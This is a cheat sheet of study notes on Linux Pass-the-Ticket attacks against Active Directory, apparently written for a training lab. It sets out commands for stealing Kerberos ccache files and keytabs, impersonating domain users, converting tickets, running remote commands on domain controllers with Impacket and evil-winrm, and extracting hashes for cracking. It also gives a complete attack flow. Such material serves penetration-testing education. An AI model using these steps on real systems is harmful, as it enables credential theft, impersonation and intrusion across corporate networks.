# 🛰️ Linux Pass the Ticket (PtT) Cheat Sheet

> [!info] 🧠 What is Linux PtT?
> 
> Bash
> 
> ```
> Lateral movement technique to hijack Active Directory tokens on Linux hosts
> ```
> 
> 💡 Allows administrators to:
> 
> - Impersonate valid AD domain users from a Linux machine
>     
> - Authenticate to remote network resources (SMB shares, DCs)
>     
> - Navigate domain environments **without knowing plaintext passwords**
>     
> 
> ✔ Common in:
> 
> - Domain-joined corporate Linux endpoints, file servers, and web hosts
>     

> [!tip] 🔧 Core Idea
> 
> Bash
> 
> ```
> Kerberos Ticket Extraction ↔ Session Injection
> ```
> 
> 💡 Key Concepts:
> 
> - **Active Directory on Linux** uses standard Kerberos infrastructure for identity management
>     
> - **Windows vs Linux:** Windows stores tickets in the isolated `LSASS` process memory; Linux stores tickets directly in the filesystem layout
>     
> 
> ✔ Think of it as **stealing a pre-authorized access token straight off the disk**

# 🌳 Structure: Storage Mechanisms

> [!info] 📚 ccache (Credential Cache)
> 
> Bash
> 
> ```
> Temporary filesystem structures holding active Kerberos session tokens
> ```
> 
> 💡 Function:
> 
> - Volatile cache generated when a domain user logs into the local Linux system
>     
> - Written by default to the **`/tmp`** directory with permissions matching the user's UID
>     
> - Tracked globally via the active **`$KRB5CCNAME`** environment variable
>     

> [!tip] 📍 Keytab (Key Table)
> 
> Bash
> 
> ```
> Local file binaries storing pairs of Kerberos principals and encrypted keys
> ```
> 
> 💡 Logic:
> 
> - Derived directly from the account password; allows automated background logins
>     
> - Used primarily by system administrators to authenticate cronjobs and automation scripts
>     
> - Non-restricted file structure that can be transferred and abused on any external host
>     

# 🔐 Storage Implementations

|**Storage Type**|**Primary Location**|**Access Requirement**|**Post-Exploitation Value**|
|---|---|---|---|
|**User Session (`ccache`)**|`/tmp/krb5cc_*`|Owner UID / **Root**|Hijack the active user's network permissions immediately|
|**System Identity (`keytab`)**|`/etc/krb5.keytab`|**Root Only**|Impersonate the Linux machine account account (`MACHINE$`)|
|**Custom Automation (`keytab`)**|Home dirs / Script paths|Readable Permissions|Recover password hashes or request automated user TGTs|

# 🔍 Footprinting & Enumeration

> [!check] 📡 Active Directory Discovery
> 
> Bash
> 
> ```
> # Verify Active Directory domain membership status
> realm list
> 
> # Check for running integration daemons if realm is unavailable
> ps -ef | grep -i "sssd\|winbind"
> ```
> 
> 💡 Reveals domain configurations and permitted logon groups.

> [!check] 🔍 Hunting for Session Assets
> 
> Bash
> 
> ```
> # Map out active user session caches in the temporary directory
> ls -la /tmp/krb5cc_*
> 
> # Check environment variables for the active session cache pointer
> env | grep -i krb5
> ```
> 
> 💡 Identifies target user sessions currently open on the machine.

> [!check] 📂 Searching for Automation Keys
> 
> Bash
> 
> ```
> # Locate exposed keytab configurations across the storage layout
> find / -name "*keytab*" -ls 2>/dev/null
> ```
> 
> 💡 Finds files holding long-term encrypted keys used by background scripts.

# ⚠️ Common Exploitation Workflows

> [!danger] 🔓 Session Hijacking via ccache (Requires Root)
> 
> Bash
> 
> ```
> # 1. Duplicate target ticket cache to a controlled location
> cp /tmp/krb5cc_647401106_target /root/hijacked_ccache
> 
> # 2. Force the current session context to target the stolen cache asset
> export KRB5CCNAME=/root/hijacked_ccache
> 
> # 3. Validate the session identity is successfully loaded
> klist
> ```
> 
> 💡 Impact: Grants immediate network authorization as the targeted domain entity.

> [!warning] ⚙️ Impersonation via Keytab (Low Privilege)
> 
> Bash
> 
> ```
> # 1. Check principal mappings inside the target keytab file
> klist -k -t /opt/specialfiles/carlos.keytab
> 
> # 2. Ingest keytab keys to request a live domain TGT session
> kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
> ```
> 
> 💡 Risk: Establishes domain access without password interaction or modification requirements.

# 🛠️ Post-Exploitation & Pivot Playbook

> [!success] 📡 Interacting with Network Shares
> 
> Bash
> 
> ```
> # Access remote Windows filesystems natively using the loaded ticket context
> smbclient //dc01/C$ -k -no-pass -c 'ls'
> ```

> [!success] 📡 Cross-Platform Interoperability
> 
> Bash
> 
> ```
> # Convert a stolen Linux ccache file into a Windows-compatible .kirbi file
> impacket-ticketConverter /root/hijacked_ccache ticket.kirbi
> ```

> [!success] 📡 Remote Command Execution
> 
> Bash
> 
> ```
> # Target remote systems from your attack host with Impacket over Kerberos
> proxychains impacket-wmiexec dc01 -k -no-pass
> 
> # Establish interactive WinRM command execution sessions via Kerberos
> proxychains evil-winrm -i dc01 -r inlanefreight.htb
> ```

> [!success] 📡 Offline Credential Recovery
> 
> Bash
> 
> ```
> # Extract raw NTLM/AES hashes out of a keytab file for offline cracking
> python3 keytabextract.py /opt/specialfiles/carlos.keytab
> ```

# ⚡ Real-World Attack Flow

> [!success] 🧠 Attack Flow
> 
> Bash
> 
> ```
> 1. Compromise domain-joined Linux node and check membership via 'realm list'
> 2. Locate exposed custom scripts or check '/tmp' for active session ccache arrays
> 3. Elevate to root to copy target ccache or run 'keytabextract.py' on keytabs
> 4. Set local '$KRB5CCNAME' context to match the targeted token path
> 5. Launch 'proxychains impacket-wmiexec -k' to execute commands on Windows DCs
> ```
> 
> 💡 Cross-platform pivoting can be performed by transforming files via `impacket-ticketConverter`.

# 🧩 Mental Model

> [!quote] 🎯 Protocol Hierarchy
> 
> Bash
> 
> ```
> ccache → The Live Boarding Pass
> Keytab → The Passport Photo & Signature
> $KRB5CCNAME → The Passenger Gate Line
> ```
> 
> 💡 You use the "Passport" (Keytab) to generate a "Boarding Pass" (ccache), then show it to the "Gate" ($KRB5CCNAME) to board network resources.